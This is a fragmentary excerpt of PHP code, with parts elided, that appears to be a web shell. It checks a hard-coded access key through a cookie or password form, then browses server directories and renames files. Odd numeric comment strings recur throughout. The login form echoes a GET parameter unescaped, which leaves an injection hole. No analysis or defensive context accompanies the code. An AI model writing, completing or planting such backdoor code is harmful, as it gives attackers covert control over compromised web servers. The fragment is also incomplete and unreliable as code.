...
$auth_key = "18db883d21d0e5f48de993840cf97bcd";
...
$pass = false;
if (isset($_COOKIE['pw_name_21662'])) {
    if(($_COOKIE['pw_name_21662']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_21662'])) {
        if(($_POST['pw_name_21662']) == $auth_key) {
            setcookie("pw_name_21662", $_POST['pw_name_21662']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_21662' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1727358969449921 1727358969371553 1727358969641418 1727358969447032
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1727358969449921 1727358969371553 1727358969641418 1727358969447032
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1727358969449921 1727358969371553 1727358969641418 1727358969447032
            $name = PATH . "/" . $_GET['r'];
